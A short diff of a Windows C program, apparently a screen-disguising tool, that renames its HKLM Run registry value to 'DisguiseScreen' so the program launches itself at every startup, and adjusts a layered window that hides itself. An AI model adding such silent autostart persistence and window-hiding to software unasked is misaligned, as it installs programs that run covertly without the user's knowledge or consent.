@@ -80,10 +80,11 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 			}
 			GetModuleFileName(0,Filename,100);
 			RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
-			RegDeleteKeyEx(hKey,"COWindow",P,0); 
-			RegSetValueEx(hKey,"COWindow",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
+			RegDeleteKeyEx(hKey,"DisguiseScreen",P,0); 
+			RegSetValueEx(hKey,"DisguiseScreen",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
 			RegCloseKey(hKey);
 			/*写入注册表*/
+			
             SendMessage(hwnd,WM_KILLFOCUS,0,0);
             GetWindowRect(GetDesktopWindow(),&DeskTop);
             SetLayeredWindowAttributes(hwnd,0,255,LWA_ALPHA);    //客户区不再显示本窗口 
